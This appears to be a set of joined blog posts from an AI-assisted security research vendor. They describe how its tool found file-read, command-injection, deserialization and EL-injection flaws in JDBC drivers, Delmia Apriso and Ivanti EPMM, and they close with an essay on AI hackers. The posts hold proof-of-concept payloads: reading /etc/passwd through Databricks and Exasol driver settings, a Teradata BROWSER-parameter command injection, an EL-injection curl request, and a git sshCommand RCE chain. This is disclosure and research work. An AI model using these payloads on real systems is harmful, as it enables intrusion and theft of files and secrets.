items.title: Auditing JDBC Drivers at Scale
items.content:
A few months back, a friend of mine,
@sudhanshur705
, was participating in a bug bounty event. He mentioned that his target scope relied heavily on JDBC drivers and asked if I wanted to collaborate and dig into the drivers used on the platform, with the hope of finding an RCE or an impactful server-side vulnerability.
Personally, I love reading code and hunting for vulnerabilities, but over the past couple of months I’ve been looking at how LLM-assisted auditing fits into pentesting and source code review. As much as I wanted to jump in manually, I figured this was a chance to see whether Hacktron CLI could help audit these JDBC drivers and find real bugs.
So I got the list of all the JDBC drivers in use and decompiled their sources. Manually reviewing each of them for file reads, writes, reflection, JNDI, deserialization, SSRF, command injection, and all the usual suspects would’ve taken so long that the event might as well finish by then (only 2 days remaining).
Hacktron CLI is our tool for code-assisted vulnerability research and pentests. I put together a “JDBC driver pack” for it. A pack is basically a curated list of agents that run on a given repo. This one was built for JDBC drivers and had an agent for each vulnerability we cared about. After about an hour, I had it ready to run against the decompiled drivers.
To try it yourself:
Terminal window
hacktron agent pack JDBC_driver
Hacktron CLI first enumerated every file-related sink in the driver and mapped which ones took dynamic input. It produced a long list of candidatees and methods and traced the input for each, starting with these file-read primitives:
Terminal window
HACKTRON
The following is a list of Java files that contain file-reading methods where the file path is provided as a variable rather than a hardcoded static value.
Assumptions:
● The analysis assumes that creating a FileEntity object implies a subsequent read operation, as its purpose is typically to encapsulate a file for data transfer.
● The analysis focuses on explicit content-reading operations. File system metadata operations like exists(), renameTo(), or delete() on File objects have been excluded.
--------
Files List:
● Path: databricks/client/hivecommon/api/TETSSLTransportFactory.java
● Line: 87
● Path: databricks/client/jdbc/common/CommonUtils.java
● Line: 66
● Path: databricks/client/jdbc/common/DSTrustManager.java
● Line: 44
● Path: databricks/client/jdbc/kerberos/JaasConfiguration.java
● Line: 25
● Path: databricks/client/jdbc42/internal/apache/commons/codec/digest/DigestUtils.java
● Line: 455
● Path: databricks/client/jdbc42/internal/apache/commons/codec/digest/HmacUtils.java
● Line: 294
● Path: databricks/client/jdbc42/internal/apache/http/conn/util/PublicSuffixMatcherLoader.java
● Line: 44
● Path: databricks/client/jdbc42/internal/apache/http/entity/FileEntity.java
● Line: 44
● Line: 50
● Path: databricks/client/jdbc42/internal/apache/http/ssl/SSLContextBuilder.java
● Line: 119
Once Hacktron CLI had gathered the interesting sinks, it went through each one to check whether the input could be traced back to user-controllable input. That would have taken me a few hours by hand. Hacktron CLI did it in 15 minutes.
In the Databricks JDBC driver, one pattern stood out: a connection-string property called
StagingAllowedLocalPaths
, intended to restrict local file staging operations to approved directories. Hacktron CLI reasoned that this defeats the purpose entirely because the allowlist itself is supplied by the user in the connection string:
Terminal window
HACKTRON
Tool → Grepping for pattern "parseStagingAllowedLocalPaths"
✧ Thought: The grep result shows that parseStagingAllowedLocalPaths is called in [databricks/client/hivecommon/core/HiveJDBCCommonConnection.java:974](./databricks/client/hivecommon/core/HiveJDBCCommonConnection.java:974) with optionalSetting41.getString() as the argument. This confirms that the allowed paths are being set from a connection setting.
To be absolutely sure, I will read the code around this line to see how optionalSetting41 is defined. This will reveal the exact name of the JDBC property.
Tool → Reading file databricks/client/hivecommon/core/HiveJDBCCommonConnection.java lines: 960-20
✧ Thought: The code in [databricks/client/hivecommon/core/HiveJDBCCommonConnection.java:973-974](./databricks/client/hivecommon/core/HiveJDBCCommonConnection.java:973-974) confirms it all. The JDBC property is StagingAllowedLocalPaths. A user can provide a comma-separated list of directories via this connection property.
This means the allowlist intended to restrict file access in [databricks/client/spark/jdbc/UCVolumeIngestionManager.java](./databricks/client/spark/jdbc/UCVolumeIngestionManager.java) is fully user-controllable. An attacker can set StagingAllowedLocalPaths to / (or any other directory) and then use the staging feature to upload any file they have read access to on the client machine. The file content is sent via an HTTP PUT request.
This confirms the vulnerability for the findings in [databricks/client/jdbc42/internal/apache/http/entity/FileEntity.java](./databricks/client/jdbc42/internal/apache/http/entity/FileEntity.java).
As soon as the driver trusts this list, the feature becomes an entry point for arbitrary file reads and writes on the client system:
Terminal window
### 2. Arbitrary File Upload via StagingAllowedLocalPaths
Description:
The StagingAllowedLocalPaths JDBC property, intended to restrict file uploads to specific directories, is user-configurable. An attacker can set this property to a sensitive location like / and then use a PUT query to exfiltrate any file from the client machine to a destination they control.
Evidence:
● Vulnerable Code: The driver creates a FileEntity from the user-provided path during a staging operation in databricks/client/spark/jdbc/UCVolumeIngestionManager.java:160.
FileEntity fileEntity = new FileEntity(new File(str2));
● Source of Taint: The allowlist is configured directly from the connection string in databricks/client/hivecommon/core/HiveJDBCCommonConnection.java:974.
Recommendation:
The StagingAllowedLocalPaths property should not be configurable via the user-supplied JDBC connection string. This security control should be managed in a configuration file on the client system that is not modifiable by the entity establishing the connection. By making this an application-level or environment-level setting, you prevent attackers from bypassing the intended restrictions.
At this point, I had no real familiarity with Databricks or how its JDBC driver worked, and the
PUT
query logic felt like gibberish. So I simply asked Hacktron CLI how a proof-of-concept would look if someone wanted to exploit this behavior. That’s when it pointed me to Databricks’
Volume storage feature
.
A query like the one below lets you upload any local file to a Databricks volume:
PUT localfile_path INTO volume_path OVERWRITE
Here is the proof of concept Hacktron CLI wrote:
Terminal window
HACKTRON
A Java code snippet for this direct attack would be:
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
public DatabricksPoc {
public static void main(String[] args) throws Exception {
// The connection string now defines /etc/ as the allowed staging path.
String jdbcUrl = "jdbc:databricks://<your-databricks-host>:443/default;StagingAllowedLocalPaths=/etc/";
// The query directly references the target file. No traversal is needed.
String maliciousPutQuery = "PUT '/etc/passwd' INTO '/Volumes/main/default/my_volume/'";
try (Connection conn = DriverManager.getConnection(jdbcUrl, "<user>", "<token>")) { Statement stmt = conn.createStatement();
// Executing this query triggers the file read and upload.stmt.execute(maliciousPutQuery);
}
When this code runs:
1. The driver checks if the parent directory of /etc/passwd (which is /etc) is in the allowed list.
2. Since you set StagingAllowedLocalPaths=/etc/, the check passes.
3. The driver reads /etc/passwd and uploads it to the specified UC Volume.
Interesting, can it do vice versa? I asked Hacktron CLI: “Okay, can we download a file from the server into an attacker-controlled local path?” It answered:
Terminal window
This flaw allows an attacker to perform two types of attacks:
1. Arbitrary File Read: The processPutRequest method ( [databricks/client/spark/jdbc/UCVolumeIngestionManager.java:151-170](./databricks/client/spark/jdbc/UCVolumeIngestionManager.java:151-170) ) reads a file from a user-provided path and sends its contents in an HTTP PUT request to a remote server. By exploiting the path traversal vulnerability, an attacker can specify an arbitrary file path (e.g., /etc/passwd), and the JDBC driver will send the contents of that file to an attacker-controlled server.
2. Arbitrary File Write: The processGetRequest method ( [databricks/client/spark/jdbc/UCVolumeIngestionManager.java:115-134](./databricks/client/spark/jdbc/UCVolumeIngestionManager.java:115-134) ) fetches content from a URL and writes it to a user-provided local file path. An attacker can exploit the path traversal to specify an arbitrary file path on the local system, causing the JDBC driver to overwrite existing files or create new ones in sensitive locations.
This gave us file read and write primitives. However, because the local user running the JDBC driver had limited permissions for writing files, we chained it with another feature in the platform that allowed the web app user to clone Git repositories. By overwriting the
.git/config
file of the cloned repository with a controlled
sshCommand
and pointing it to a remote SSH URL, performing a Git operation like creating a new branch from the platform executed our command. This turned the file read/write primitive into an RCE.
Databricks added a note to its documentation that letting users control
StagingAllowedLocalPaths
can lead to security issues.
The Exasol driver had a similar arbitrary file read, with one limitation: it throws an exception if the file content has certain characters. Hacktron CLI flagged it like this:
Terminal window
HACKTRON
### 1. Arbitrary File Read via JDBC Connection URL (High Severity)
An attacker can read arbitrary files from the client's filesystem by providing a specially crafted JDBC connection URL. The contents of the specified file are disclosed in the resulting SQLException message.
Vulnerable Code:
The vulnerability exists in the [readFile](./exasol/jdbc/EXAURLParser.java:142-168) method within [exasol/jdbc/EXAURLParser.java](./exasol/jdbc/EXAURLParser.java). When a JDBC URL such as jdbc:exa:////etc/passwd is provided, the driver attempts to parse the path as a file. If an error occurs during file processing, the exception message includes the file's contents.
Recommendation:
● Avoid Leaking File Content: Modify the exception handling in the [readFile](./exasol/jdbc/EXAURLParser.java:142-168) method to return a generic error message instead of the file's content.
● Validate Paths: Ensure that any file path read from the connection URL is validated to prevent directory traversal and restrict access to expected locations.
In our case we read the application’s secrets file.
A few other drivers were vulnerable to full-response SSRF and RCE. For example, the Teradata driver had a command injection that other researchers had already disclosed. Here is Hacktron CLI’s report:
Terminal window
HACKTRON
Vulnerability Details:
● File: [com/teradata/jdbc/jdbc/BrowserAuth.java](./com/teradata/jdbc/jdbc/BrowserAuth.java)
● Category: Command Injection
● Severity: High
Description:
The vulnerability originates from the BROWSER connection parameter. The value of this parameter is retrieved at [BrowserAuth.java:27](./com/teradata/jdbc/jdbc/BrowserAuth.java:27) and stored in the browser variable without proper sanitization. This tainted variable is later used to construct a command string which is executed by the system at [BrowserAuth.java:117](./com/teradata/jdbc/jdbc/BrowserAuth.java:117). An attacker can inject malicious commands by crafting a special BROWSER parameter value.
Code Snippets:
● Source (User Input):
// The 'browser' variable is assigned from the user-controlled 'BROWSER' connection parameter.
String browser = uRLParameters.getBrowser(); // [com/teradata/jdbc/jdbc/BrowserAuth.java:27]
● Sink (Command Execution):
// Inside the doBrowserAuth method, the tainted string is used to build a command.
String replaceAll = str3.replaceAll(PLACEHOLDER, ...); // [com/teradata/jdbc/jdbc/BrowserAuth.java:114]
// The constructed command is executed.
Process exec = Runtime.getRuntime().exec(replaceAll); // [com/teradata/jdbc/jdbc/BrowserAuth.java:117]
Proof of Concept:
An attacker can exploit this by providing a malicious JDBC connection URL. For example, on a Linux system, the following URL would execute the gnome-calculator application by injecting it into the command line:
jdbc:teradata://<host>/LOGMECH=BROWSER,BROWSER='gnome-calculator;'
Across different vendor drivers, Hacktron CLI surfaced multiple vulnerabilities that netted a total of $85,000 in bug bounties.
I still love cracking open code by hand, but with only two days left in the event there was no realistic way I could manually go through every JDBC driver’s parsing logic. Hacktron CLI did the mechanical reading, and I spent my time on the creative part.
We’re onboarding early users for Hacktron CLI.
Join the waitlist
to get the same tooling we used for this project.

items.content:
In the early days, we benchmarked Hacktron’s capabilities to browse large codebases and find exploitable vulnerabilities. We focused on real-world codebases that we had previously audited, as prior knowledge helps triage and eliminate false positives.
Delmia Apriso is a manufacturing execution system. At one point Apple hosted it externally, and Boeing, Airbus France, and Lockheed Martin are among its users.
Synacktiv
and I (while at ProjectDiscovery) have audited its code. Its backend is .NET and the codebase is relatively large, which made it a good candidate for benchmarking Hacktron.
Hacktron ended up finding
CVE-2025-5086
, a pre-auth remote code execution vulnerability with a 9.0 CVSS severity rating.
Hacktron’s environment and objective
Knowing a few things about .NET, we provided Hacktron with the decompiled source code and the webroot/install directory contents, since configuration files such as
web.config
are there and apply based on directory structure:
➜ DELMIA-Apriso-2025 ls
flexnet_decompiled_dlls install_dir_contents
We provided Hacktron with the following objective:
Objective
You’re reviewing the C#/ASP.NET-based codebase of a web application called
Delmia Apriso FlexNet. The goal is to assess the application for any
unauthenticated insecure deserialization risks, especially those that could be
triggered through user-controllable input. Focus on identifying patterns where
external data is processed in ways that might lead to unsafe deserialization,
particularly in the absence of strong validation or protective controls.
After embedding our own knowledge into Hacktron, we wanted to see how it approaches and flags bugs and whether that matches how we would think through an audit ourselves.
Tracing deserialization sinks
Here is how Hacktron thinks about the code:
Thinking
Let’s search for all occurrences of
.Deserialize(...)
across
.cs
files. This should reveal common sinks like
BinaryFormatter
,
XmlSerializer
, or custom deserializers.
This led to many sinks and multiple paths for Hacktron to explore. One example:
FlexNet.Apriso.ClientComponents.ScreenFlow/ScreenFlow/SfControllerExtender.cs
98
dictionary2.Add(keyValuePair.Key, SfControllerExtender.Deserialize(keyValuePair.Value.ToString()));
Just seeing a
.Deserialize(...)
call can look promising, but when Hacktron opened it up, it discovered this:
1
public static PropertyBag Deserialize(string content)
2
{
3
// ...
4
return JsonConvert.DeserializeObject<Dictionary<string, object>>(content);
5
}
In other words, it’s just a thin wrapper over
JsonConvert.DeserializeObject(...)
. Hacktron checked whether this JSON call uses any unsafe settings, such as
TypeNameHandling
. JSON deserialization is usually safe, but if
TypeNameHandling
is enabled anywhere, an attacker can inject arbitrary types, so it searched the whole codebase for it:
Thinking
This looks like a custom JSON-based deserializer. By default,
JsonConvert.DeserializeObject
uses
TypeNameHandling = None
(safe). There’s no
JsonSerializerSettings
passed here, so nested objects simply get re-parsed recursively. We’d need
TypeNameHandling.All
(or similar) to let the client dictate type information. Let’s search globally for any
TypeNameHandling
references.
Terminal window
exec_command('grep -R "TypeNameHandling" -n /app')
# No results
Since no
TypeNameHandling
reference was found, Hacktron assumed the default setting (
TypeNameHandling = None
) applies. With that pathway ruled out, it marked this as a dead end and moved on to investigate other parts of the source code.
Thinking
I haven’t found any clear instances of
BinaryFormatter.Deserialize
or
JsonConvert.DeserializeObject
with
TypeNameHandling
enabled that are reachable from unauthenticated user input. The
XmlSerializer
path seems constrained by the server-side type definition. The
Runtime.Deserialize
path leads to code I cannot analyze. The
SfControllerExtender
path using
JsonConvert
seems safe due to default settings, and I couldn’t trace its origin anyway.
Perhaps I should look for other potentially dangerous serializers like
LosFormatter
,
ObjectStateFormatter
, or
NetDataContractSerializer
.
Finding NetDataContractSerializer
As Hacktron navigates deeper through the codebase, it comes across
FlexNetOperationsService.cs
.
It detects
NetDataContractSerializer
, a serializer that embeds .NET type metadata and is dangerous when fed untrusted input.
Thinking
Okay, this is interesting!
NetDataContractSerializer
is explicitly mentioned via the
[NetDataContractSerializerBehavior]
attribute applied to the
FlexNetOperationsService
in
/app/FlexNet.WebUI.WebServices/FlexNetOperationsService.cs
.
NetDataContractSerializer
is dangerous because, like
BinaryFormatter
, it includes .NET type information in the serialized data (XML in this case), allowing an attacker to potentially control the type being deserialized. If this service endpoint is reachable without authentication and processes user-supplied data using this serializer, it could lead to arbitrary object deserialization and RCE.
I need to examine
FlexNetOperationsService.cs
to understand:
What methods does this service expose?
Do any methods take parameters that are deserialized using
NetDataContractSerializer
?
Is the service accessible without authentication?
Looking at the attributes applied to the
FlexNetOperationsService
and the
Invoke
method:
1
[NetDataContractSerializerBehavior]
2
[AspNetCompatibilityRequirements(RequirementsMode = AspNetCompatibilityRequirementsMode.Allowed)]
3
[ServiceBehavior(AddressFilterMode = AddressFilterMode.Any)]
4
5
public class FlexNetOperationsService : IFlexNetOperationsService {
6
public Outcome Invoke(OperationExecutionParameters parameters, out PropertyBag outputs)
7
}
Confirming the service is reachable pre-auth
The hypothesis below is the interesting part. Hacktron noticed that the WCF service has no auth annotations and that the binding is in
web.config
, but the service definition is commented out. Would it still be reachable?
Thinking
There are no standard ASP.NET or WCF authorization attributes like
[Authorize]
or
[AllowAnonymous]
applied to either the or the method. In WCF, the absence of explicit security configuration in
web.config
and the lack of authorization attributes in the code often defaults to no authentication.
Thinking
This main
web.config
for the
/WebServices/
directory provides more context:
FlexNetOperationsService.svc
Binding: Lines 64-71 show a commented-out service definition for
FlexNet.FunctionInterpreter.WebServices.FlexNetOperationsService
. If this were active, it would use the
wsHttpBinding
named
FlexNetConfiguration
.
FlexNetConfiguration
Binding: Lines 84-90 define the
wsHttpBinding
named
FlexNetConfiguration
. Crucially, it confirms
<security mode="None">
.
Service Implementation: The service implementation is
FlexNet.FunctionInterpreter.WebServices.FlexNetOperationsService
.
Hypothesis: Although the service definition for
FlexNetOperationsService.svc
is commented out in
web.config
, the
.svc
file itself exists (
/app/install_dir_contents/WebSite/WebServices/FlexNetOperationsService.svc
). It’s possible that the service is activated by the presence of the
.svc
file.
Reporting
Confirming that the service can be accessed pre-auth and does allow deserialization, Hacktron reported the issue to us:
GitHub issue #22 reporting unauthenticated arbitrary deserialization in FlexNetOperationsService

items.title: Another Pre-auth RCE in Ivanti EPMM
items.content:
After
CVE-2025-4427
and
CVE-2025-4428
, which described a pre-auth RCE chain in Ivanti EPMM, we wondered whether there were more variants. We had Hacktron, our AI-powered security researcher, analyze similar code paths, validate error handling logic, and trace other EL injection surfaces.
It found a previously undocumented pre-authenticated RCE variant in Ivanti EPMM via a different endpoint:
/api/v2/policy/androidfirmware
.
Another EL injection
Just like the initially reported vulnerability, this new variant also stems from an Expression Language (EL) injection flaw. The root cause is in how the validator handles user-supplied data. Specifically, the
AndroidFirmwarePolicyRequestValidator
processes the
deviceModel
parameter, which is part of the
ZebraFirmwareSelection
object within the request body.
If a validation error occurs related to this
deviceModel
, the provided input is directly incorporated into the error message template.
As we learned from the previous analysis blogposts by
ProjectDiscovery
and
watchTowr
, Hibernate Validator’s
ConstraintValidatorContext.buildConstraintViolationWithTemplate(String messageTemplate)
function allows developers to create dynamic error messages. However, if the
messageTemplate
incorporates unsanitized user input, it creates a critical security issue. Hibernate Validator, especially when integrated with Spring, can interpret
${...}
within these templates as Expression Language (EL) expressions.
The
/api/v2/policy/androidfirmware
endpoint, handled by
AndroidFirmwarePolicyControllerV2
, is protected by Spring Security’s
@PreAuthorize
annotation, which should restrict access to authorized users.
Spring order of operations
Although the endpoint is protected with Spring Security’s
@PreAuthorize
annotation, the bug lies in the order of operations:
Bean validation (via
@Valid
) runs before Spring Security authorization.
That means attackers can trigger EL-based validation errors before any auth checks are enforced.
This design flaw let unauthenticated users trigger the validation logic and, through it, execute code.
Hacktron’s findings
Hacktron traced the data flow and pinpointed the vulnerable components:
The
AndroidFirmwarePolicyControllerV2.java
controller handles the
/api/v2/policy/androidfirmware
endpoint with
createPolicy
(POST) and
updatePolicy
(PUT) methods. Both methods use
@PreAuthorize
for access control and
@Valid
to trigger validation of the
AndroidFirmwarePolicyRequest
:
1
@RequestMapping(method = {RequestMethod.POST})
2
@PreAuthorize("hasPermissionForSpace(#adminDeviceSpaceId, {'PERM_POLICY_EDIT'})")
3
@ResponseBody
4
public Response createPolicy(@RequestParam(defaultValue = "0") Integer adminDeviceSpaceId, @Valid @RequestBody final AndroidFirmwarePolicyRequest policyRequest, /* ... */) {
5
// ...
6
}
1
@RequestMapping(method = {RequestMethod.PUT}, value = {"/{policyId}"})
2
@PreAuthorize("hasPermissionForSpace(#adminDeviceSpaceId, {'PERM_POLICY_EDIT'})")
3
@ResponseBody
4
public Response updatePolicy(@RequestParam(defaultValue = "0") int adminDeviceSpaceId, @PathVariable @Valid final Long policyId, @Valid @RequestBody final AndroidFirmwarePolicyRequest policyRequest, /* ... */) {
5
// ...
6
}
This custom validator, triggered by
@ValidAndroidFirmwarePolicyRequest
on the request object, contains the vulnerable logic. The
validateZebraFirmwareSelection
method, called during validation, can lead to the invocation of
setLocalizedErrorMessageToContext
:
1
private boolean setLocalizedErrorMessageToContext(final ConstraintValidatorContext context, final EFOTAMessageKey messageKey, Object... params) {
2
3
String formatMessage = this.localizedMessageBuilder.getLocalizedMessage(messageKey, params);
4
context.disableDefaultConstraintViolation();
5
6
context.buildConstraintViolationWithTemplate(formatMessage).addConstraintViolation();
7
return false;
8
}
The call chain is
isValid
→
isValidZebraFirmwareSetting
→
validateZebraFirmwareSelection
→
setLocalizedErrorMessageToContext
.
Proof of concept
To demonstrate the potential vulnerability, Hacktron crafted the following curl request. By injecting an EL expression into the
deviceModel
field and ensuring other validation criteria trigger an error message that uses this field, we can observe if the expression is evaluated:
curl request
curl -X POST -k -H "Content-Type: application/json" --data '''
{
"policyName": "adminzz",
"active": true,
"policyPriority": 1,
"policylistname": 2,
"description": "aaaaa",
"enableAndroidSystemUpdate": true,
"updateType": "automatic",
"updateWindowStartHour": "",
"updateWindowEndHour": "",
"forceUpdateStartDate": "",
"forceUpdateStartHour": "",
"zebraRequireCharging": true,
"zebraRequireIdle": true,
"policyId": 3,
"priority": 0,
"enableSamsungFirmwareUpdate": false,
"enableZebraFirmwareUpdate": true,
"zebraDownloadOverMeteredNetwork": false,
"freezePeriods": [],
"deviceFirmwareSelections": [],
"zebraFirmwareSelections": [
{
"deviceModel": "${3*3333}",
"targetBuildId": "NA",
"currentBuildId": "dummyBuildId",
"downloadUrl": "http://example.com/dummy.zip",
"fileSize": 1024,
"osVersion": "1x0.0",
"artifactFingerprint": "dummyfingerprint",
"securityPatchDate": "2023-01-01"
}
],
"forceUpdateEndDate": "",
"forceUpdateEndHour": ""
}
''' https://ivant-epmm/api/v2/policy/androidfirmware
Response:
1
{
2
"messages": [
3
{
4
"type": "Error",
5
"messageKey": "com.mobileiron.vsp.messages.validation.global.error",
6
"localizedMessage": "9999: The Target Build ID for the selected firmware cannot be null.",
7
"messageParameters": [
8
"9999: The Target Build ID for the selected firmware cannot be null."
9
]
10
}
11
]
12
}
Automating variant analysis with Hacktron
We first tasked Hacktron with reversing the original CVE (
CVE-2025-4427
). Once it successfully identified the known vulnerability and understood the underlying EL injection via Hibernate Validator, we asked it to initiate variant analysis with the following prompt:
Objective
Your task is to find a variant of the below described vulnerability…
We initially thought this was a 0-day and reported the bug to Ivanti. However, after reporting, we concluded that this variant doesn’t affect the latest version due to the Hibernate Validator version upgrade. Still, it reveals how dangerous code patterns can slip through even after fixing known sinks (
ScepSubjectValidator
and
DeviceFeatureUsageReportQueryRequestValidator
).
Google Project Zero wrote in a blog post:
“We also feel that this variant-analysis task is a better fit for current LLMs than the more general open-ended vulnerability research problem. By providing a starting point – such as the details of a previously fixed vulnerability – we remove a lot of ambiguity from vulnerability research, and start from a concrete, well-founded theory: ‘This was a previous bug; there is probably another similar one somewhere’.”
Hacktron started from the original vulnerability and searched the rest of the codebase for the same pattern.
To have Hacktron look for vulnerabilities in your codebase,

.

items.title: AI Hackers: Threat and Opportunity
items.content:
Freedom invites chaos
Security is seldom the first priority of a new technology, and in the wild west of the Internet, hackers will always rise up to the intellectual challenge of breaking into the latest and greatest. Science fiction’s habit of assuming that a powerful, disruptive technology leads to chaos and destruction is overly pessimistic, but it has a point.
When Robert Morris created the infamous Morris worm in 1988, he simply wanted to see if it could be done. This is perhaps not too different from when an innocent software engineer who hasn’t done any serious hacking before
decided to poke into production apps hosted by Lovable
.
Code generation tools like Lovable let a new generation of non-technical users create software, and they do it by giving the AI absolute freedom over the code it writes. But just like how the wild west of the Internet had tons of competing browsers (none of them secure) before browser standards became a thing, we are headed into a new wild west of AI-generated code where the rate of code generation far outstrips the human ability to review and secure it.
The freedom to create has always invited chaos in software. Much of the recent work in the security space has tried to rein in that chaos by making it intuitive to only create a strict subset of all possible software and hoping that this subset is secure. “Secure by default” frameworks are a good example. The difference this time is that the number of insecure systems, which used to scale linearly with human capital, will soon scale exponentially with the number of GPU cores.
Scale is the enemy
Great, the amount of code in the world is going to explode. Surely the same AI that generated the code can also be used to secure it, right?
Let’s take a step back and look at what a vulnerability
is
. A vulnerability can only exist if there is a difference between the intended behavior of a system and the actual behavior of that system. So to prove a vulnerability, you are showing that
Given a system S, there exists an input I such that S(I) is not equal to T(I), where T is the intended behavior of S.
and presumably that mismatch gives the attacker some kind of advantage over the system.
So proving that a system is secure is way harder than proving that it is insecure. This doesn’t even take into account the fact that you can’t expect an AI agent to have the full context of the system in its working memory, for a codebase of any reasonable size. Any gaps in context when forming abstractions (e.g. through summarization) will lead to a gap in understanding, and thus a gap in reasoning about security. It’s the same challenge that humans face when writing code, and why vulnerabilities exist in the first place.
To find vulnerabilities, on the other hand, is much easier. Perhaps performing novel security research (the kind that takes years, like
James Kettle’s work on HTTP request smuggling
) is still a bit too much to ask of AI agents just yet, but in reality, most vulnerabilities are repetitions of the same mistakes. This variant analysis is something that AI agents can be good at.
The models will only get more intelligent. At Hacktron, we’ve been consistently impressed by the ability of AI agents to find and exploit vulnerabilities in complex codebases that would have taken us days to fully understand.
I believe that AI will expand the capabilities of threat actors exponentially, at a time when the number of true vulnerabilities in the world is also exploding. Where previously nation-state espionage scaled only with human capital, it will, in a few years, be a far more worthwhile endeavor to simply run a cluster of AI hackers targeting systems that don’t have an army of SOC operators behind them.
The likely targets are tech startups and mid-sized companies, and these are precisely the companies that won’t be prepared for the day this happens. North Korea has so far only been able to afford targeting a handful of carefully selected targets, but this is likely going to change when it becomes much more cost-effective to cast a wider net.
The opportunity
There are two potential futures here:
No one except nation-states builds AI hackers, and X years from now, country Y unleashes their AI hackers on the world. This future sucks.
Someone builds an AI hacker as a service, the world integrates it into their security stacks, realizes how scary good it is, wakes up, catches up to it, and we are all prepared for the day that country Y unleashes their AI hackers on the world. This future is much better.
The second future is the one that I am betting on. That’s why I believe in Hacktron.
Every
software company in the world is going to need to be protected round the clock, and the best way to do that is to have a team of AI hackers working for you.
Over the next few years, I believe we will slowly start to see this generational threat unfold.
